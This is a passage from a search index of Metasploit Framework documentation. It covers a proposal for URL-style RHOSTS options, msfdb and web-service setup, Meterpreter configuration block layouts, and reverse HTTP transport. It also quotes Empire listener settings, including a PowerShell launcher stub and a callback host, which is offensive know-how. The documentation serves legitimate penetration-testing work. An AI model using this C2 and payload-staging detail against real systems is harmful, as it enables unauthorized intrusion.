type:host:port[,type:host:port][...] RHOSTS https://a.site.com/abc http://b.site.com/xyz yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;' RPORT 443, 80 yes The target port (TCP) SSL true, false no Negotiate SSL/TLS for outgoing connections TARGETURI /abc, /xyz yes The URI path of the manager app (/html/upload and /undeploy will be used) VHOST a.site.com, b.site.com no HTTP server virtual host . Alternatively: The above scenario is intuitive when used with multiple RHOSTS, however when a single RHOST is used the user may intend for setting TARGETURI to behave differently. In this scenario the user may expect two scans to be ran against the single target: . set RHOSTS https://a.site.com/foo set TARGETURI /abc /xyz Module options (exploit/multi/http/tomcat_mgr_upload): Name Current Setting Required Description ---- --------------- -------- ----------- HttpPassword no The password for the specified username HttpUsername no The username to authenticate as Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS https://a.site.com/abc https://a.site.com/xyz yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;' RPORT 443, 80 yes The target port (TCP) SSL true, false no Negotiate SSL/TLS for outgoing connections TARGETURI /abc, /xyz yes The URI path of the manager app (/html/upload and /undeploy will be used) VHOST a.site.com, a.site.com no HTTP server virtual host . It’s still possible to use the CIDR range notation, but the support remains closer to the current Metasploit console workflow: . set RHOSTS 192.168.100.0/22 set TARGETURI /tomcat set SSL true Module options (exploit/multi/http/tomcat_mgr_upload): Name Current Setting Required Description ---- --------------- -------- ----------- HttpPassword no The password for the specified username HttpUsername no The username to authenticate as Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 192.168.100.0/22 yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;' RPORT 80 yes The target port (TCP) SSL true, false no Negotiate SSL/TLS for outgoing connections TARGETURI /tomcat yes The URI path of the manager app (/html/upload and /undeploy will be used) VHOST no HTTP server virtual host . Advantages . | It’s possible to configure the target with one set command | Backwards compatible | The user can directly copy/paste a URL from their browser into msfconsole to run a check module against | A module can now be run against multiple arbitrary targets with independent paths / ports | Helps to catch improperly set ports. For instance, setting the SSL option to true - but forgetting to update RPORT to 443 | The existing metadata/options remains intact for the user to view | CIDR notation can continue to be used | . Disadvantages . | This is a novel implementation effort. The current design of Metasploit framework’s Options/Datastore doesn’t support computed / dependent options. | More complicated to implement than a single TARGETS option | The intuition of computed options paired with last write winning might be confusing to users - but this would need to be tested | . ",
    "url": "/docs/development/propsals/metasploit-url-support-proposal.html#2-enriching-rhosts-with-url-support",
    "relUrl": "/docs/development/propsals/metasploit-url-support-proposal.html#2-enriching-rhosts-with-url-support"
  },"429": {
    "doc": "Metasploit URL support proposal",
    "title": "3. Support setting a single RHOST_URL",
    "content": "Metasploit console will now support setting a single RHOST_URL value. Note that this wouldn’t show as an option to the user, but would be used as a ‘macro’ to populate the existing datastore values: . set RHOST_URL https://a.site.com/foo Module options (exploit/multi/http/tomcat_mgr_upload): Name Current Setting Required Description ---- --------------- -------- ----------- HttpPassword no The password for the specified username HttpUsername no The username to authenticate as Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS a.site.com yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;' RPORT 443 yes The target port (TCP) SSL true no Negotiate SSL/TLS for outgoing connections TARGETURI /foo yes The URI path of the manager app (/html/upload and /undeploy will be used) VHOST a.site.com no HTTP server virtual host . After this convenience option has been set, it is now possible to use the normal workflow of msfconsole to set further options: . set RURL https://a.site.com/foo set TARGETURI /bar set SSL FALSE set RPORT 80 Module options (exploit/multi/http/tomcat_mgr_upload): Name Current Setting Required Description ---- --------------- -------- ----------- HttpPassword no The password for the specified username HttpUsername no The username to authenticate as Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS a.site.com yes The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;' RPORT 80 yes The target port (TCP) SSL true no Negotiate SSL/TLS for outgoing connections TARGETURI /bar yes The URI path of the manager app (/html/upload and /undeploy will be used) VHOST a.site.com no HTTP server virtual host . Similarly this functionality would set all options of the global store as expected: . setg RHOST_URL https://a.site.com/foo setg Global ====== Name Value ---- ----- RHOST a.site.com RPORT 443 SSL true TARGETURI /foo VHOST a.site.com . Advantages . | Simpler to reason about as an end user | Less complex to implement, and can be built upon the current Options/Datastore implementation with relative ease | As a user it’s now easy to configure one option | The user can directly copy/paste a URL from their browser into msfconsole to run a check module against | Helps to catch improperly set ports. For instance, setting the SSL option to true - but forgetting to update RPORT to 443 | Backwards compatible | The existing metadata/options remains intact for the user to view | . Disadvantages . | It is not possible to set multiple multiple targets. However this can still be implemented with resource scripts. | Harder to discover, we will have to add extra affordance for this - and make additional noise to help increase the awareness of this new functionality | Users may raise issues asking for the next obvious step of multiple targets | Future compatibility issues. If we decide implement support for multiple independent targets, there’s some baggage introduced in needing to alias RURL to RURLS etc. | . Additional considerations . | How likely are individuals to actually scan against completely arbitrary endpoints with independent ports etc in the real world? | There will be no changes to the SSL_VERSION option as part of this effort | When setting multiple targets, is a comma delimited string \", \" to separate targets the best approach? It’s technically possible that copied URLs from the browser potentially contain this substring. Additional affordance may need to be added to ensure commas without a trailing whitespace is notified as being a potential issue. | The naming of TARGETURI is unintuitive, perhaps it could be renamed to RPATH | The chosen implementation should ensure file support is not broken . | https://github.com/rapid7/metasploit-framework/pull/11497 | . | Consistency across module types, and external modules, will have to be ensured: . | https://github.com/rapid7/metasploit-framework/issues/13061 | . | Will database modules be impacted by this change? It is currently unclear. | Postgres natively supports connection strings and the notation is not novel postgres://{user}:{password}@{hostname}:{port}/{database-name} | . | Will FTP modules be impacted by this change? It is currently unclear. | FTP URL syntax is described in RFC 1738, taking the form: ftp://[user[:password]@]host[:port]/url-path | . | Will SRVHOST by impacted by this change? This will remain the same, but could be changed. | SRVHOST- The local host to listen on. This must be an address on the local machine or 0.0.0.0 | SRVPORT 8080 - The local port to listen on. | . | Allowing multiple arbitrary targets with independent ports, protocols etc, is potentially a different development effort to allowing rhosts to support URL syntax. | . ",
    "url": "/docs/development/propsals/metasploit-url-support-proposal.html#3-support-setting-a-single-rhost_url",
    "relUrl": "/docs/development/propsals/metasploit-url-support-proposal.html#3-support-setting-a-single-rhost_url"
  },"430": {
    "doc": "Metasploit URL support proposal",
    "title": "Similar Efforts",
    "content": "RouterSploit . Routersploit is a Python exploitation framework for embedded devices. The interactive console allows the user to specify a TARGET option. This value can only be configured with a valid IPv4/IPv6 address: . rsf &gt; use exploits/routers/2wire/ rsf (2Wire Gateway Auth Bypass) &gt; show options Target options: Name Current settings Description ---- ---------------- ----------- ssl false SSL enabled: true/false target Target IPv4, IPv6 address: 192.168.1.1 port 80 Target HTTP port Module options: Name Current settings Description ---- ---------------- ----------- verbosity true Verbosity enabled: true/false . With a module that supports a configurable path: . rsf &gt; use exploits/generic/shellshock rsf (Shellshock) &gt; show options Target options: Name Current settings Description ---- ---------------- ----------- ssl false SSL enabled: true/false target Target IPv4 or IPv6 address port 80 Target HTTP port Module options: Name Current settings Description ---- ---------------- ----------- verbosity true Verbosity enabled: true/false path / Url path method GET HTTP method header User-Agent HTTP header injection point . Empire . Empire is a now retired post exploitation framework for windows. The interactive console provides both a Host configuration, as well as the ability to individually configure options: . (Empire) &gt; listeners [!] No listeners currently active (Empire: listeners) &gt; uselistener http (Empire: listeners/http) &gt; info Name Required Value Description ---- -------- ------- ----------- Name True http Name for the listener. Host True http://192.168.246.234 Hostname/IP for staging. BindIP True 0.0.0.0 The IP to bind to on the control server. Port True Port for the listener. Launcher True powershell -noP -sta -w 1 -enc Launcher string. StagingKey True d6ca3fd0c3a3b462ff2b83436dda495e Staging key for initial agent negotiation. DefaultDelay True 5 Agent delay/reach back interval (in seconds). DefaultJitter True 0.0 Jitter in agent reachback interval (0.0-1.0). DefaultLostLimit True 60 Number of missed checkins before exiting DefaultProfile True /admin/get.php,/news.php,/login/ Default communication profile for the agent. process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko CertPath False Certificate path for https listeners. KillDate False Date for the listener to exit (MM/dd/yyyy). WorkingHours False Hours for the agent to operate (09:00-17:00). Headers True Server:Microsoft-IIS/7.5 Headers for the control server. Cookie False sTAZwcPKtawpT Custom Cookie Name StagerURI False URI for the stager. Must use /download/. Example: /download/stager.php UserAgent False default User-agent string to use for the staging request (default, none, or other). Proxy False default Proxy to use for request (default, none, or other). ProxyCreds False default Proxy credentials ([domain\\]username:password) to use for request (default, none, or other). SlackToken False Your SlackBot API token to communicate with your Slack instance. SlackChannel False #general The Slack channel or DM that notifications will be sent to. Setting the Host option will configure both the Host option, as well as the Port: . Empire: listeners/http) &gt; set Host http://10.10.14.31:443 (Empire: listeners/http) &gt; info Name: HTTP[S] Category: client_serverAuthors: @harmj0yDescription: Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach.HTTP[S] Options: Name Required Value Description ---- -------- ------- ----------- Name True http Name for the listener. Host True http://10.10.14.31:443 Hostname/IP for staging. BindIP True 0.0.0.0 The IP to bind to on the control server. Port True 443 Port for the listener. Launcher True powershell -noP -sta -w 1 -enc Launcher string. StagingKey True d6ca3fd0c3a3b462ff2b83436dda495e Staging key for initial agent negotiation. DefaultDelay True 5 Agent delay/reach back interval (in seconds). DefaultJitter True 0.0 Jitter in agent reachback interval (0.0-1.0). DefaultLostLimit True 60 Number of missed checkins before exiting DefaultProfile True /admin/get.php,/news.php,/login/ Default communication profile for the agent. process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko CertPath False Certificate path for https listeners. KillDate False Date for the listener to exit (MM/dd/yyyy). WorkingHours False Hours for the agent to operate (09:00-17:00). Headers True Server:Microsoft-IIS/7.5 Headers for the control server. Cookie False sTAZwcPKtawpT Custom Cookie Name StagerURI False URI for the stager. Must use /download/. Example: /download/stager.php UserAgent False default User-agent string to use for the staging request (default, none, or other). Proxy False default Proxy to use for request (default, none, or other). ProxyCreds False default Proxy credentials ([domain\\]username:password) to use for request (default, none, or other). SlackToken False Your SlackBot API token to communicate with your Slack instance. SlackChannel False #general The Slack channel or DM that notifications will be sent to. Likewise, updating the individual port will be reflected in the Host option: . (Empire: listeners/http) &gt; set Port 1234 (Empire: listeners/http) &gt; info Name: HTTP[S] Category: client_server Authors: [@harmj0y](https://www.github.com/harmj0y) Description: Starts a http[s] listener (PowerShell or Python) that uses a GET/POST approach. HTTP[S] Options: Name Required Value Description ---- -------- ------- ----------- Name True http Name for the listener. **Host True http://10.10.14.31:1234 Hostname/IP for staging.** BindIP True 0.0.0.0 The IP to bind to on the control server. **Port True 1234 Port for the listener.** . ",
    "url": "/docs/development/propsals/metasploit-url-support-proposal.html#similar-efforts",
    "relUrl": "/docs/development/propsals/metasploit-url-support-proposal.html#similar-efforts"
  },"431": {
    "doc": "Metasploit URL support proposal",
    "title": "Metasploit URL support proposal",
    "content": " ",
    "url": "/docs/development/propsals/metasploit-url-support-proposal.html",
    "relUrl": "/docs/development/propsals/metasploit-url-support-proposal.html"
  },"432": {
    "doc": "Metasploit Web Service",
    "title": "Managing the Web Service",
    "content": "Requirements . To use the web service you will need a PostgreSQL database to serve as the backend data store. The msfdb tool allows you to manage both the Metasploit Framework database and web service. If you are going to configure the database manually you can find more information on the Managing the Database page. Getting Started . Initialize the Database and Web Service . Execute msfdb init and respond to prompts during the interactive initialization. The script first creates and configures the database, then it configures the web service, and finally configures the local msfconsole with the new data service connection. msfdb . The msfdb tool allows you to manage both the Metasploit Framework database and web service components together or independently. If the --component option is not provided then the specified command will be executed for the database followed by the web service. This default mode of operation is useful when first setting up the database and web service. The component may be specified if you wish to make changes to a given component independent of the other. Usage: msfdb [options] &lt;command&gt; . | Options: . | Execute msfdb --help for the complete usage information | . | Commands: . | init - initialize the component | reinit - delete and reinitialize the component | delete - delete and stop the component | status - check component status | start - start the component | stop - stop the component | restart - restart the component | . | . Examples . | msfdb start - Start the database and web service | msfdb --component webservice stop - Stop the web service | msfdb --component webservice --address 0.0.0.0 start - Start the web service, listening on any host address | . Notes . | SSL is enabled by default and msfdb will generate a fake “snakeoil” SSL certificate during initialization using Rex::Socket::Ssl.ssl_generate_certificate if one is not provided. The generated SSL certificate uses a random common name (CN) which will not match your hostname, therefore, you will need to make appropriate accommodations when operating the web service with such a certificate. Please generate your own SSL certificate and key instead and supply those to msfdb using the --ssl-cert-file and --ssl-key-file options, and enable SSL verification by passing the option --no-ssl-disable-verify. | A simple verification that web service is up and running can be performed using cURL: curl --insecure -H \"Accept: application/json\" -H \"Authorization: Bearer &lt;token&gt;\" https://localhost:5443/api/v1/msf/version . | . Accessing the API . The API account can be accessed with your preferred web browser by visiting https://&lt;address&gt;:&lt;port&gt;/api/v1/auth/account. If you want to change the API token for your account you can log in to the API account page and generate a new API token. You can find more information on the data models and various API endpoints by visiting the API Documentation at: https://&lt;address&gt;:&lt;port&gt;/api/v1/api-docs . ",
    "url": "/docs/using-metasploit/advanced/metasploit-web-service.html#managing-the-web-service",
    "relUrl": "/docs/using-metasploit/advanced/metasploit-web-service.html#managing-the-web-service"
  },"433": {
    "doc": "Metasploit Web Service",
    "title": "Utilizing the Data Service in msfconsole",
    "content": "Connecting . You can use the db_connect command to connect to the desired data service. When you successfully connect to a data service that connection will be saved in the Metasploit config file. You can provide a name with the -n option, otherwise one will be randomly generated. You can then use that name to reconnect to the data service at a later time. Please note that you can only be connected to one data service at a time. The db_disconnect command will need to be used before switching to a new data service. You can use db_status to see information about the currently connected data service. Usage: db_connect &lt;options&gt; &lt;url&gt; . | Options: . | -l,--list-services - List the available data services that have been previously saved. | -y,--yaml - Connect to the data service specified in the provided database.yml file. | -n,--name - Name used to store the connection. Providing an existing name will overwrite the settings for that connection. | -c,--cert - Certificate file matching the remote data server’s certificate. Needed when using self-signed SSL cert. | -t,--token - The API token used to authenticate to the remote data service. | --skip-verify - Skip validating authenticity of server’s certificate (NOT RECOMMENDED). | . | Examples: . | db_connect http://localhost:5443 - Connect to the Metasploit REST API instance at localhost running on port 5443 | db_connect -c ~/.msf4/msf-ws-cert.pem -t 72ce00fd9ab1a96970137e5a12faa12f38dcc4a9e42158bdd3ce7043c65f5ca37b862f3faf3630d2 https://localhost:5443 - Connect to the server running at localhost on port 5443 that has SSL and authentication enabled. | db_connect -l - List the data services that have been saved. | db_connect -n LA_server http://localhost:5443 - Connect to the data service running on localhost port 5443 and assign the name “LA_server” to the saved entry. | . | URL Formats . | HTTP - http://&lt;host&gt;:&lt;port&gt; | HTTPS - https://&lt;host&gt;:&lt;port&gt; | Postgres - &lt;user&gt;:&lt;password&gt;@&lt;host&gt;:&lt;port&gt;/&lt;database name&gt; | . | . Setting a Default Data Service . The db_save command can be used to save the currently connected data service as the default. Every time msfconsole starts up it will attempt to connect to that data service. You can always switch between data services if you have a default set, this will just determine which data service you are connected to when msfconsole is started. Usage: db_save . | Examples: . | db_connect http://localhost:5443 then db_save - Connect to the data service running on localhost port 5443 then set it as the default connection. | . | . Removing Saved Data Services . Saved data services can be removed using the db_remove command. This can be useful if the data service no longer exists at that location, or if you no longer want to keep a record of it around for fast connection. Usage: db_remove &lt;name&gt; . | Examples: . | db_remove LA_server - Remove the saved data service entry called “LA_server” | . | . Notes . There are a few pieces of information to keep in mind when using data services with Metasploit Framework. | Specifying the name of an existing saved data service connection will overwrite those settings. | A data service must already have an existing entry in the list of saved data services to be set as the default. Data services that were connected to using a database.yml file cannot be saved as default using this method. | A Postgres database connection is required before connecting to a remote data service. | The configuration from the database.yml will still be honored for the foreseeable future, but a saved default data service will take priority when it is present. | The saved data services are stored in the Metasploit config file, which is located at ~/.msf4/config by default. | . ",
    "url": "/docs/using-metasploit/advanced/metasploit-web-service.html#utilizing-the-data-service-in-msfconsole",
    "relUrl": "/docs/using-metasploit/advanced/metasploit-web-service.html#utilizing-the-data-service-in-msfconsole"
  },"434": {
    "doc": "Metasploit Web Service",
    "title": "Metasploit Web Service",
    "content": "The Metasploit web service allows interaction with Metasploit’s various data models through a REST API. ",
    "url": "/docs/using-metasploit/advanced/metasploit-web-service.html",
    "relUrl": "/docs/using-metasploit/advanced/metasploit-web-service.html"
  },"435": {
    "doc": "Configuration",
    "title": "On this page",
    "content": ". | How the configuration is found . | Loading configuration in Windows Meterpreter | Loading configuration in POSIX Meterpreter (Mettle) | . | Windows Meterpreter configuration block structure . | Session configuration block | Transport configuration block . | Common configuration values | TCP configuration values | HTTP/S configuration values | Transport configuration list | . | Extension configuration block | . | Configuration block overview | . Meterpreter has always needed to be configured on the fly so that it knows how to talk to Metasploit. For many years, this configuration management was achieved by hot-patching a copy of the metsrv DLL/binary using a simple “string replace” approach. This worked well enough to support a number of situations but restricted the flexibility of Meterpreter and its support for handling multiple transports. It wasn’t just transports that were locked down, but the ability to provide payloads that contained way more than the core Meterpreter (metsrv) itself. It was also not easy to pass other forms of information on the fly to the Meterpreter instance because the stagers were only able to pass in a copy of the active socket handle. Recent modifications to Meterpreter have done away with this old method and have replaced with a dynamic configuration block that can be used to alleviate these problems and provide the flexibility for other more interesting things down the track. This document contains information on the structure and layout of the new configuration block, along with how it is used by Meterpreter. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-configuration.html#on-this-page",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-configuration.html#on-this-page"
  },"436": {
    "doc": "Configuration",
    "title": "How the configuration is found",
    "content": "In the past, Meterpreter has required that the stager (or stage0 as some like to call it) pass in a handle to the active socket so that it can take over communications without creating a new socket (at least in the case of TCP connections). While this feature is still required, it doesn’t happen in the way that it used to. Instead, Meterpreter now requires that the stager pass in a pointer to the start of the configuration block. The configuration block can be anywhere in memory, so long as the memory region is marked as RWX. Loading configuration in Windows Meterpreter . Stage 1 of loading Windows Meterpreter now utilises a new loader, called meterpreter_loader (Win x86, Win x64), which does the following: . | Loads the metsrv DLL from disk. | Patches the DOS header of the DLL so that it contains executable shellcode that correctly initializes metsrv and calculates the location that points to the end of metsrv in memory. It also takes any existing socket value (found in edi or rdi depending on the architecture) and writes that directly to the configuration (more on this later). | Generates a configuration block and appends this to the metsrv binary. | . The result is that the payload has the following structure once it has been prepared: . +--------------+ | Patched DOS | header | +--------------+ | . metsrv dll . | +--------------+ | config block | +--------------+ . Loading configuration in POSIX Meterpreter (Mettle) . All of the configuration for the POSIX Meterpreter is able to be passed through command-line arguments to the payload. When generating a payload with a specific configuration, a simulated command line is patched into a static variable in the main startup code. Generate a payload and see ./mettle -h for a full description of available arguments. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-configuration.html#how-the-configuration-is-found",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-configuration.html#how-the-configuration-is-found"
  },"437": {
    "doc": "Configuration",
    "title": "Windows Meterpreter configuration block structure",
    "content": "In order to pass information to Meterpreter and not have it break, a known format of configuration is required. This format needs to be consistent on each invocation, much like you would expect with any configuration. In the case of binary Meterpreter (POSIX and Windows), this configuration block contains the following: . | One Session configuration block. | One or more Transport Configuration blocks, followed by a terminator. | One or more Extension configuration blocks, followed by a terminator. | . Each of these blocks is described in detail in the sections below. Session configuration block . The notion of a session configuration block is used to wrap up the following values: . | Socket handle - When Meterpreter is invoked with TCP communications, an active socket is already in use. This socket handle is intended to be reused by Meterpreter when metsrv executes. This socket handle is written to the configuration block on the fly by the loader. It is stored in the Session configuration block so that it has a known location. This value is always a 32-bit DWORD, even on 64-bit platforms. | Exit func - This value is a 32-bit DWORD value that identifies the method that should be used when terminating the Meterpreter session. This value is the equivalent of the Block API Hash that represents the function to be invoked. Meterpreter used to delegate the responsibility of handling this to the stager that had invoked it. Meterpreter no longer does this, instead, it handles the closing of the Meterpreter session by itself, and hence the chosen method for termination must be made known in the configuration. | Session expiry value - This is a 32-bit DWORD that contains the number of seconds that the Meterpreter session should last for. While Meterpreter is running, this value is continually checked, and if the session expiry time is reached, then Meterpreter shuts itself down. For more information, please read Meterpreter Timeout Control. | UUID - This is a 16-byte value that represents a payload UUID. A UUID is a new concept that has come to Metasploit with a goal of tracking payload type and origin, and validating that sessions received by Metasploit are intended for use by the current installation. For more information, please read Payload UUID. | . The layout of this block in memory looks like this: . +--------------+ |Socket Handle | +--------------+ | Exit func | +--------------+ |Session Expiry| +--------------+ | | UUID | | | +--------------+ | &lt;- 4 bytes -&gt;| . With this structure in place, Meterpreter knows that the session configuration block is exactly 28 bytes in size. The Session configuration block description can be found in the Meterpreter source. Transport configuration block . The Transport configuration block is a term used to refer to the group of transport configurations that are present in the payload. Meterpreter now supports multiple transports, and so the configuration should support multiple transports too. There are two main issues when dealing with transport configurations: . | The configuration should allow for many transport configurations to be specified. | The configuration should allow for each transport to be of a different type and size. | . Meterpreter’s current transport implementations provide two main “classes” of transport, those being HTTP(S) and TCP. Each of these transport classes requires different configuration values, as well as common values, in order to function. Common configuration values . The values that are common to both HTTP(S) and TCP transports are: . | URL - This value is a meta-description of the transport and is used not only as a configuration element for the transport itself but also as a way of determining what type of transport this block represents. The field is a total of 512 characters (Windows Meterpreter uses wchar_t, while POSIX Meterpreter uses char). Transport types are specified by the scheme element in the URL, and the body of the URL specifies key information such as host and port information. Meterpreter inspects this to determine what type of transport block is in use, and hence from there is able to determine the size of the block. Valid values look like the following: . | tcp://&lt;host&gt;:&lt;port&gt; - indicates that this payload is a reverse IPv4 TCP connection. | tcp6://&lt;host&gt;:&lt;port&gt;?&lt;scope&gt; - indicates that this payload is a reverse IPv6 TCP connection. | tcp://:&lt;port&gt; - indicates that this payload is a bind payload listening on the specified port (note that no host is specified). | http://&lt;host&gt;:&lt;port&gt;/&lt;uri&gt; - indicates that this payload is an HTTP connection (can only be reverse). | https://&lt;host&gt;:&lt;port&gt;/&lt;uri&gt; - indicates that this payload is an HTTPS connection (can only be reverse). | . | Communications expiry - This value is another 32-bit DWORD value that represents the number of seconds to wait between successful packet/receive calls. For more information, please read the Timeout documentation (link coming soon). | Retry total - This value is 32-bit DWORD value that represents the number of seconds that Meterpreter should continue to attempt to reconnect on this transport before giving up. For more information, please read the Timeout documentation (link coming soon). | Retry wait - This value is 32-bit DWORD value that represents the number of seconds between each attempt that Meterpreter makes to reconnect on this transport. For more information, please read the Timeout documentation (link coming soon). | . The layout of this block in memory looks like the following: . +--------------+ | | URL | . 512 characters worth . (POSIX -&gt; ASCII -&gt; char) . (Windows -&gt; wide char -&gt; wchar_t) . | +--------------+ | Comms T/O | +--------------+ | Retry Total | +--------------+ | Retry Wait | +--------------+ | &lt;- 4 bytes -&gt;| . The common transport configuration block description can be found in the Meterpreter source. TCP configuration values . At this time, there are no TCP-specific configuration values, as the common configuration block caters for all of the needs of TCP transports. This may change down the track. HTTP/S configuration values . HTTP and HTTPS connections have a number of extra configuration values that are required in order to make it function correctly in various environments. Those values are: . | Proxy host - In environments where proxies are required to be set manually, this field contains the detail of the proxy to use. The field is 128 characters in size (wchar_t only, given that we don’t yet have HTTP/S transport in POSIX), and can be in one of the following formats: . | http://&lt;proxy ip&gt;:&lt;proxy port&gt; in the case of HTTP proxies. | socks=&lt;socks ip&gt;:&lt;sock port&gt; in the case of socks proxies. | . | Proxy user name - Some proxies require authentication. In such cases, this value contains the username that should be used to authenticate with the given proxy. This field is 64 characters in size (wchar_t). | Proxy password - This value will accompany the user name field in the case where proxy authentication is required. It contains the password used to authenticate with the proxy and is also 64 characters in size (wchar_t). * User agent string - Customisable user agent string. This changes the user agent that is used when HTTP/S requests are made to Metasploit. This field is 256 characters in size (wchar_t). | Expected SSL certificate hash - Meterpreter has the capability of validating the SSL certificate that Metasploit presents when using HTTPS. This value contains the 20-byte SHA1 hash of the expected certificate. For more information, please read the SSL certificate validation documentation (link coming soon). | . All values that are shown above need to be specified in the configuration, including SSL certificate validation for plain HTTP connections. Values that are not used should be zeroed out. The structure of the HTTP/S configuration is as follows. +--------------+ | | Proxy host | . 128 characters worth (wchar_t) | +--------------+ | | Proxy user | . 64 characters worth (wchar_t) | +--------------+ | | Proxy pass | . 64 characters worth (wchar_t) | +--------------+ | | User agent | . 256 characters worth (wchar_t) | +--------------+ | | SSL cert | SHA1 hash | | | +--------------+ | &lt;- 4 bytes -&gt;| . The HTTP/S transport configuration block description can be found in the Meterpreter source. Transport configuration list . As already mentioned, more than one of these transport configuration blocks can be specified. In order to facilitate this, Meterpreter needs to know when the “list” of transports has ended. Using the URL, Meterpreter can determine the size of the block and can move to the next block, depending on the type that is discovered. As soon as Meterpreter detects a transport configuration URL value that has a string length of zero, for example, a single NULL ASCII char in POSIX and a single NULL multi-byte char in Windows, it assumes that the transport list has been terminated. The byte immediately following this is deemed to be the start of the Extension configuration, which is documented in the next section. Extension configuration block . The extension configuration block is designed to allow Meterpreter payloads to contain any extra extensions that the user wants to bundle in. The goal is to provide the ability to have Stageless payloads (link coming soon), and to provide the means for sharing of extensions during migration (though this hasn’t been implemented yet). Each of the extensions must have been compiled with Reflective DLL Injection support, as this is the mechanism that is used to load the extensions when Meterpreter starts. For more information on this facility, please see the Stageless payloads (link coming soon) documentation. The extension configuration block also functions as a “list” to allow for an arbitrary number of extensions to be included. Each extension entry needs to contain: . | Size - This is the exact size, in bytes, of the extension DLL itself. The value is a 32-bit DWORD. | Extension binary - This is the full binary directly copied from the DLL. This value needs to be exactly the same length as what is specified in the Size field. | . When loading the extensions from the configuration, Meterpreter will continue to parse entries until it finds a size value of 0. At this point, Meterpreter assumes it has reached the end of the extension list and will stop parsing. The structure is simply laid out like the following: . +--------------+ | Ext. Size | +--------------+ | Ext. content | +--------------+ | NULL term. | (4 bytes) | +--------------+ . ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-configuration.html#windows-meterpreter-configuration-block-structure",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-configuration.html#windows-meterpreter-configuration-block-structure"
  },"438": {
    "doc": "Configuration",
    "title": "Configuration block overview",
    "content": "To summarise, the following shows the layout of a full configuration: . +--------------+ |Socket Handle | +--------------+ | Exit func | +--------------+ |Session Expiry| +--------------+ | | UUID | | | +--------------+ | Transport 1 | tcp://... | . | +--------------+ | Comms T/O | +--------------+ | Retry Total | +--------------+ | Retry Wait | +--------------+ | Transport 2 | http://... | . | +--------------+ | Comms T/O | +--------------+ | Retry Total | +--------------+ | Retry Wait | +--------------+ | | Proxy host | | +--------------+ | | Proxy user | | +--------------+ | | Proxy pass | | +--------------+ | | User agent | | +--------------+ | | SSL cert | SHA1 hash | | +--------------+ | NULL term. |(1 or 2 bytes)| +--------------+ | Ext 1. Size | +--------------+ |Ext 1. content| +--------------+ | Ext 2. Size | +--------------+ |Ext 2. content| +--------------+ | NULL term. | +--------------+ . ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-configuration.html#configuration-block-overview",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-configuration.html#configuration-block-overview"
  },"439": {
    "doc": "Configuration",
    "title": "Configuration",
    "content": " ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-configuration.html",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-configuration.html"
  },"440": {
    "doc": "HTTP Communication",
    "title": "HTTP Communication",
    "content": "The Meterpreter payload supports a number of transport, including reverse_http and reverse_https. This document describes how these transports work. The Initial URL . During the generation process for a new reverse_http or reverse_https payload, an initial connect-back URL will be created. This URL will be either “short” or “long” and the 8-bit checksum of this URL will be set to one of the INIT_* constants defined in the UriChecksum mixin. The URL will be generated using the base64url character set. The “short” URL will always be 5 bytes in length while the “long” URL will be between 30 and 128 bytes in length. Which variant is used is determined by the space constraints of the exploit that generates the payload. The “long” URL can also include an embedded Payload UUID. The Connection URL . The HTTP handler within Metasploit will receive the request for the initial URL, determine which INIT_* checksum it correlates to, extract any embedded Payload UUID, and then respond with either the second stage for staged payloads or a new URL for stageless payloads. The new URL is generated by the handler, will embed any Payload UUID that was included in the original request, and will hash to the value defined by the URI_CHECKSUM_CONN constant. Note that characters other than the base64url character set are ignored during calculation of the checksum. The connect URL must be unique between sessions in order for the sessions to function properly. TLS Certificate Pinning . The Meterpreter HTTPS transport supports certificate pinning. This applies to the stageless payloads as well as Meterpreter payloads loaded with the reverse_winhttps stagers. At this time, some of the non-Windows stagers also support certificate pinning, but this is still a work in progress. Certificate pinning is enabled by setting the StagerVerifySSLCert option to true and by extracting a SHA1 hash of the certificate specified in the HandlerSSLCert option. The SHA1 hash of the certificate will be verified during the staging process, and also in the handler, if these options are specified in the listener. This feature requires the pre-generation of a unified SSL/TLS certificate in PEM format, with the private key followed by one or more certificates in the chain. If an incoming session connects through a man-in-the-middle proxy that presents a different certificate, the first connection will connect back, but then immediately terminate. The handler will detect a non-responsive connection and close the session automatically. The command below generates a custom unified PEM TLS certificate that works with the HandlerSSLCert option: . $ openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \\ -subj \"/C=US/ST=Texas/L=Austin/O=Development/CN=www.example.com\" \\ -keyout www.example.com.key \\ -out www.example.com.crt &amp;&amp; \\ cat www.example.com.key www.example.com.crt &gt; www.example.com.pem &amp;&amp; \\ rm -f www.example.com.key www.example.com.crt . The Application Protocol . Once the Meterpreter connect URL is requested, the actual dispatch loop starts to run. The Meterpreter payload will make repeated requests with a HTTP body consistent of “RECV”. Any queued commands will be returned to the payload, which will process them individually, and return the results in a following request. If no commands were returned as a result of a “RECV” request, the payload will double the interval until the next request, with a maximum that is generally about 10 seconds. Additional details about the configuration of the HTTP transport can be found on the transport control wiki page. ",
    "url": "/docs/using-metasploit/advanced/meterpreter/meterpreter-http-communication.html",
    "relUrl": "/docs/using-metasploit/advanced/meterpreter/meterpreter-http-communication.html"
  },"441": {
    "doc": "Paranoid Mode",
    "title": "Paranoid Mode",
